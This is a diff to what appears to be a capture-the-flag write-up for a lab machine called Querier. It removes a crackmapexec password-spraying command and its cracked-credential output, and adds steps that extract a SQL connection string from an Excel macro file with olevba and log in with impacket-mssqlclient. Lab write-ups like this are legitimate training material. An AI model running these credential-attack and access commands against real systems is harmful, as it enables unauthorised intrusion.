@@ -184,12 +184,20 @@ Hyperlinks Changed              : No
 App Version                     : 16.0300
 ```
 
-I got user credential:
+I have install olevba:
 
 ```bash
-crackmapexec smb 10.10.10.125 -d 'QUERIER' -u Luis -p /usr/share/wordlists/rockyou.txt 
-SMB         10.10.10.125    445    QUERIER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:QUERIER) (domain:QUERIER) (signing:False) (SMBv1:False)
-SMB         10.10.10.125    445    QUERIER          [+] QUERIER\Luis:123456 
+pipx install oletools
+```
+
+```bash
+olevba Currency\ Volume\ Report.xlsm
+```
+
+This dump a SQL Connection string and I used to connect on SQL Server:
+
+```bash
+impacket-mssqlclient reporting@10.10.10.125 -windows-auth
 ```
 
 ---
